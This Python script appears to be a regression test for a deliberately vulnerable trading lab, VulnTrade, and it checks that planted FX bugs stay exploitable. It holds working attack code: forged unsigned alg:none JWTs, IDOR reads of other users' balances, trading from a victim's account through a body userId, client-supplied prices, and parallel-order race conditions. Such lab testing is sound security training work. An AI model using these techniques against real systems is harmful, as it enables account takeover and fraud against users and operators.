#!/usr/bin/env python3
"""
VulnTrade 1.0.0: prove that every intended product vulnerability still FIRES.

    python3 test/product_bugs.py --base-url http://192.168.67.2:31080 [--only fx,equities,crypto]

This is the opposite of a security test: each check passes when the bug is exploitable,
exactly as designed (docs/vulnerabilities.md #101-#120 and the re-homed trading vulns).
It uses its own fresh users named bug_<run>_* (test/invariants.py ignores them, because
breaking the money rules is their whole point). Run it against a lab, never anything real.
"""
import argparse
import base64
import json
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from decimal import Decimal as D

import requests

RUN = uuid.uuid4().hex[:5]
FIRED, MISSED = [], []


def fires(name, ok, detail=""):
    (FIRED if ok else MISSED).append(name)
    print("  [%s] %s%s" % ("FIRES" if ok else "MISSING", name, "" if ok else "  -> %s" % str(detail)[:300]))


class Lab:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.http = requests.Session()

    def user(self, tag):
        name = "bug_%s_%s" % (RUN, tag)
        r = self.http.post(self.base + "/api/auth/register",
                           json={"username": name, "password": "Passw0rd!", "email": name + "@example.test"})
        r.raise_for_status()
        u = r.json()
        u["auth"] = {"Authorization": "Bearer " + u["token"]}
        return u

    def get(self, path, user=None, **kw):
        return self.http.get(self.base + path, headers=(user or {}).get("auth"), timeout=30, **kw)

    def post(self, path, body, user=None, headers=None):
        h = dict((user or {}).get("auth") or {})
        h.update(headers or {})
        return self.http.post(self.base + path, json=body, headers=h, timeout=60)

    def parallel(self, calls):
        with ThreadPoolExecutor(max_workers=len(calls)) as pool:
            return list(pool.map(lambda c: c(), calls))


def alg_none_token(user_id, username, role="TRADER"):
    """An unsigned JWT (alg: none). VULN #56: JwtTokenProvider accepts it."""
    enc = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
    return enc({"alg": "none"}) + "." + enc({"sub": username, "userId": user_id, "role": role,
                                             "exp": int(time.time()) + 3600}) + "."


# ---------------------------------------------------------------------------
# FX
# ---------------------------------------------------------------------------

def fx_balance(lab, user, asset):
    rows = lab.get("/api/fx/balances", user).json()["balances"]
    return next((D(str(b["available"])) for b in rows if b["asset"] == asset), D(0))


def fx_quote(lab, pair="EURUSD"):
    return next(q for q in lab.get("/api/fx/quotes").json() if q["pair"] == pair)


def fx_order(lab, user, body):
    return lab.post("/api/fx/orders", body, user).json()


def fx_section(lab):
    print("FX")
    a = lab.user("fxa")

    q = fx_quote(lab)
    fires("FX-6 price stream leaks bank prices, our margin and the House position",
          bool(q.get("lpQuotes")) and "margin" in q and "houseNet" in q, q)

    old = fx_quote(lab)
    time.sleep(PriceValid.SECONDS + 1)
    r = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "100", "quoteId": old["quoteId"]})
    fires("FX-1 an expired quote (older than 2 s) is still filled at its old price",
          r.get("status") == "FILLED" and D(str(r["price"])) == D(str(old["ask"])), r)

    r = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "1000", "price": "0.0001"})
    fires("FX-2 the client's own price is trusted (1,000 EUR for 0.10 USD)",
          r.get("status") == "FILLED" and D(str(r["pay"]["amount"])) <= D("0.10"), r)

    q = fx_quote(lab)
    r = fx_order(lab, a, {"pair": "EURUSD", "side": "SELL", "amount": "1", "quoteId": q["quoteId"]})
    exact = D(1) * D(str(q["bid"]))
    fires("FX-3 rounding in the client's favour (receive rounded up)",
          r.get("status") == "FILLED" and D(str(r["receive"]["amount"])) > exact, {"receive": r.get("receive"), "exact": exact})

    fx_order(lab, a, {"pair": "USDJPY", "side": "SELL", "amount": "10"})          # get some JPY first
    r = fx_order(lab, a, {"pair": "USDJPY", "side": "BUY", "amount": "100", "amountCurrency": "QUOTE"})
    fires("FX-4 wrong leg: spend 100 JPY, receive ~15,000 USD instead of ~0.66",
          r.get("status") == "FILLED" and D(str(r["receive"]["amount"])) > D(1000), r)

    # FX-5: five parallel 300,000 EUR buys (cheap thanks to FX-2); one by one only 3 fit under the 1M limit
    b = lab.user("fxb")
    results = lab.parallel([lambda: fx_order(lab, b, {"pair": "EURUSD", "side": "BUY", "amount": "300000", "price": "0.0001"})
                            for _ in range(5)])
    filled = sum(1 for r in results if r.get("status") == "FILLED")
    fires("FX-5 exposure check race: parallel orders push the House past its 1,000,000 EUR limit", filled >= 4,
          [r.get("status") + "/" + str(r.get("reason")) for r in results])
    # give the EUR back, so the House is not left at its limit for the next run
    eur = fx_balance(lab, b, "EUR")
    if eur > 0:
        fx_order(lab, b, {"pair": "EURUSD", "side": "SELL", "amount": str(eur), "price": "0.0001"})

    # #43: two parallel buys spend the same USD
    c = lab.user("fxc")
    q = fx_quote(lab)
    results = lab.parallel([lambda: fx_order(lab, c, {"pair": "EURUSD", "side": "BUY", "amount": "8500", "quoteId": q["quoteId"]})
                            for _ in range(4)])
    filled = sum(1 for r in results if r.get("status") == "FILLED")
    fires("#43 (FX) balance race: parallel buys spend the same USD", filled >= 2 and fx_balance(lab, c, "USD") < 0,
          {"filled": filled, "usd": str(fx_balance(lab, c, "USD"))})

    r1 = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "10", "clientOrderId": "dup-" + RUN})
    r2 = fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "10", "clientOrderId": "dup-" + RUN})
    fires("#41 (FX) clientOrderId replay: the same id is filled twice",
          r1.get("status") == r2.get("status") == "FILLED" and r1["orderId"] != r2["orderId"], [r1, r2])

    victim = lab.user("fxv")
    before = fx_balance(lab, victim, "USD")
    fx_order(lab, a, {"pair": "EURUSD", "side": "BUY", "amount": "100", "userId": victim["userId"]})
    fires("#71 (FX) a userId in the body trades from someone else's account", fx_balance(lab, victim, "USD") < before,
          {"before": str(before), "after": str(fx_balance(lab, victim, "USD"))})

    r = lab.get("/api/fx/balances?userId=%s" % victim["userId"], a)
    fires("IDOR (#47 style) ?userId= shows another user's FX balances",
          r.ok and r.json().get("userId") == victim["userId"], r.text)
    r = lab.get("/api/fx/orders?userId=%s" % victim["userId"], a)
    fires("IDOR (#47 style) ?userId= shows another user's FX orders", r.ok and len(r.json()) > 0, r.text)

    forged = alg_none_token(victim["userId"], victim["username"])
    r = lab.http.get(lab.base + "/api/fx/balances", headers={"Authorization": "Bearer " + forged})
    fires("#56 an unsigned (alg:none) token is accepted by the gateway",
          r.ok and r.json().get("userId") == victim["userId"], r.text)
    r = lab.http.get(lab.base + "/api/fx/balances", params={"api_key": a["apiKey"]})
    fires("#15 API key in the URL works on the gateway", r.ok and r.json().get("userId") == a["userId"], r.text)


class PriceValid:
    SECONDS = 2


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--only", default="fx,equities,crypto")
    args = ap.parse_args()
    lab = Lab(args.base_url)
    only = args.only.split(",")
    sections = {"fx": fx_section}
    for name in only:
        if name in sections and lab.get("/api/%s/%s" % (name, "pairs" if name == "fx" else "market/prices")).ok:
            sections[name](lab)
    print("\n%d bugs fire, %d missing%s" % (len(FIRED), len(MISSED), (": %s" % MISSED) if MISSED else ""))
    return 0 if not MISSED else 1


if __name__ == "__main__":
    sys.exit(main())
